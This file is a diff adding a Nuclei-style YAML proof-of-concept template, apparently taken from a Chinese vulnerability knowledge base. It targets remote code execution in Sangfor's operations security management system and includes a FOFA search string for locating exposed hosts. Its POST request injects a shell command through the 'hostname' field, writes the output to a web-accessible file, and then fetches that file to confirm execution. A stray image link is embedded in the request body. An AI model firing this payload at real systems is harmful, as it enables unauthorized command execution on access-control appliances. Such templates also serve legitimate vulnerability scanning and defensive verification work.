@@ -1,0 +1,67 @@
+id: poc-wloivtgnmkpvo5hl
+info:
+  name: 深信服运维安全管理系统 session 存在远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wloivtgnmkpvo5hl'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wloivtgnmkpvo5hl
+    fofa: product="SANGFOR-运维安全管理系统"
+http:
+- raw:
+  - 'POST /isomp-protocol/protocol/session HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 76
+
+    Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
+
+    Accept-Language: zh-CN
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept: text/plain, */*; q=0.01
+
+    X-Requested-With: XMLHttpRequest
+
+    Access_token: null
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Dest: empty
+
+    Accept-Encoding: gzip, deflate, br
+
+    Priority: u=0, i
+
+    Connection: keep-alive
+
+
+    hostname=;id>/usr/local/tomcat/webapps/fort/trust/js/hello.txt;&port=11&protocol=x11&resolution=1*11&session_path=1&sid=1
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1769350928522-46980df9-c130-48fa-abbc-89ab1467f811.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /fort/trust/js/hello.txt HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
